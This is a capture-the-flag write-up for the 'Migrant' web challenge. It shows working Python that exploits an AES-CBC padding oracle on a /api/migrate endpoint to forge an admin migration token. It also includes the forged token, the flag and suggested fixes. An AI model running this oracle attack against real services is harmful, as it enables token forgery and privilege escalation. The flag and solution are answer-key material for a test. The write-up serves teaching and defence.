---
title: Migrant
date: 2026-07-06
tags:
- web
- LYKNCTF
---

- **Challenge:** Migrant
- **Category:** Web
- **Flag:** `LYKNCTF{11311c31e309406a9fa63363789f58b1}`

---

## My initial read / first impressions

The challenge description says:

```text
The company currently changed their brand identity, and all staff must migrate their accounts to this new website. But... something is off with the transfer function.
```

Opening the site gives a page called:

```text
System V2 Migration
```

The app asks us to paste an encrypted migration token. It also gives us a starter token for a standard user:

```text
R0KqKPKEhNKUNzvATjSBWs3tpXNIAqCWHQ2MLRrMepmGRaFkLknI82UgF+H0yuCDirMjArGvXjmjKENbkuX1Gw==
```

Submitting that token to `/api/migrate` returns:

```json
{
  "message": "Migration successful.",
  "profile": {
    "role": "user",
    "user": "guest",
    "v": "1.0"
  }
}
```

So the goal is pretty clear: make the migration system believe the encrypted profile belongs to an admin instead of a normal user.

## Looking at the token

The token is base64. Decoding it gives 64 bytes:

```python
import base64

token = "R0KqKPKEhNKUNzvATjSBWs3tpXNIAqCWHQ2MLRrMepmGRaFkLknI82UgF+H0yuCDirMjArGvXjmjKENbkuX1Gw=="
raw = base64.b64decode(token)

print(len(raw))
print([raw[i:i+16].hex() for i in range(0, len(raw), 16)])
```

Output:

```text
64
['4742aa28f28484d294373bc04e34815a',
 'cdeda5734802a0961d0d8c2d1acc7a99',
 '8645a1642e49c8f3652017e1f4cae083',
 '8ab32302b1af5e39a328435b92e5f51b']
```

That immediately looks like:

```text
IV || C1 || C2 || C3
```

with a 16-byte block cipher, probably AES-CBC.

## The important error leak

The useful part was how the endpoint responded to broken tokens.

If I changed bytes near the end of the ciphertext, the server returned:

```json
{"error":"Token corrupted, invalid padding"}
```

But if I changed bytes earlier, the server returned:

```json
{"error":"Token decrypted, but profile data is unreadable"}
```

That distinction is the whole challenge.

The server is telling us whether the decrypted plaintext has valid PKCS#7 padding. That gives us a CBC padding oracle.

So instead of needing the encryption key, we can ask the server yes/no questions about padding and recover intermediate block values.

## Confirming the plaintext shape

Using the padding oracle, I decrypted the original token and recovered the profile JSON:

```text
{"user":"guest", "role":"user", "v":"1.0"}
```

With padding included, the blocks were:

```text
P1 = {"user":"guest",
P2 =  "role":"user", 
P3 = "v":"1.0"}\x06\x06\x06\x06\x06\x06
```

At first I tried a cheaper CBC bit flip to change `user` into a same-length role like `root`. That worked once the first block was repaired:

```json
{
  "message": "Migration successful.",
  "profile": {
    "role": "root",
    "user": "guest",
    "v": "1.0"
  }
}
```

But that did not give the flag. The app wanted the exact role:

```text
admin
```

Since `admin` is longer than `user`, a simple same-length bit flip was not enough. I needed to forge a full valid ciphertext for a new plaintext.

## Forging an admin token

For CBC mode:

```text
P_i = D_K(C_i) xor C_{i-1}
```

If we can recover `D_K(C_i)` for a block using the padding oracle, then we can choose the previous ciphertext block to make the plaintext whatever we want:

```text
C_{i-1} = D_K(C_i) xor desired_plaintext_block
```

To forge a full token, I worked backwards:

1. Pick a random final ciphertext block.
2. Use the padding oracle to recover its intermediate value.
3. XOR that with the desired final plaintext block to get the previous ciphertext block.
4. Repeat until the IV is produced.

The target plaintext was:

```json
{"user":"guest", "role":"admin", "v":"1.0"}
```

Padded into 16-byte blocks:

```text
{"user":"guest",
 "role":"admin",
 "v":"1.0"}\x05\x05\x05\x05\x05
```

The core oracle logic looked like this:

```python
import base64
import json
import os
import requests

BASE = "http://TARGET"
BS = 16


def valid_padding(token_bytes):
    token = base64.b64encode(token_bytes).decode()
    r = requests.post(
        BASE + "/api/migrate",
        json={"token": token},
        timeout=5,
    )
    return "invalid padding" not in r.text


def decrypt_intermediate(cblock):
    inter = bytearray(BS)
    prev = bytearray(BS)

    for pos in range(BS - 1, -1, -1):
        pad = BS - pos

        for j in range(pos + 1, BS):
            prev[j] = inter[j] ^ pad

        for guess in range(256):
            prev[pos] = guess

            if valid_padding(bytes(prev) + cblock):
                inter[pos] = guess ^ pad
                break

    return bytes(inter)


def pkcs7(data):
    pad = BS - (len(data) % BS)
    return data + bytes([pad]) * pad
```

Then the forge is just the CBC equation in reverse:

```python
target = b'{"user":"guest", "role":"admin", "v":"1.0"}'
blocks = [
    pkcs7(target)[i:i + BS]
    for i in range(0, len(pkcs7(target)), BS)
]

cblocks = [os.urandom(BS)]

for block in reversed(blocks):
    inter = decrypt_intermediate(cblocks[0])
    previous = bytes(a ^ b for a, b in zip(inter, block))
    cblocks.insert(0, previous)

forged = b"".join(cblocks)
print(base64.b64encode(forged).decode())
```

My final forged token was:

```text
ISDT12SecLCr4/x5wWT3WcNUF0ga7pocuALVCaBVkj3qYFio8LNDzQPu//oyJ7NMrKWncH7B4YbX3/IhB02wbQ==
```

Submitting it returned:

```json
{
  "flag": "LYKNCTF{11311c31e309406a9fa63363789f58b1}",
  "message": "Migration successful. Welcome back, Admin.",
  "profile": {
    "role": "admin",
    "user": "guest",
    "v": "1.0"
  }
}
```

## Why this works

The app made two mistakes:

1. It encrypted the profile using CBC mode without authenticating the ciphertext.
2. It exposed different errors for padding failures and JSON parse failures.

CBC encryption by itself does not prove that a ciphertext was created by the server. If there is no MAC or AEAD mode, an attacker can modify ciphertext blocks and control how the next plaintext block changes.

The padding oracle makes it much worse. Because the server tells us whether the padding is valid, we can recover intermediate block values and build a completely new valid ciphertext for a chosen profile.

So the actual attack flow was:

```text
submit original token
    -> confirm normal user profile
flip ciphertext bytes
    -> notice padding error vs JSON error
use padding oracle
    -> recover CBC intermediate values
forge chosen plaintext
    -> {"user":"guest", "role":"admin", "v":"1.0"}
submit forged token
    -> flag
```

The fix would be to authenticate the token before decrypting it, or just use an AEAD mode like AES-GCM. Also, the app should not expose different error messages for padding and parsing failures.

## Flag

```text
LYKNCTF{11311c31e309406a9fa63363789f58b1}
```
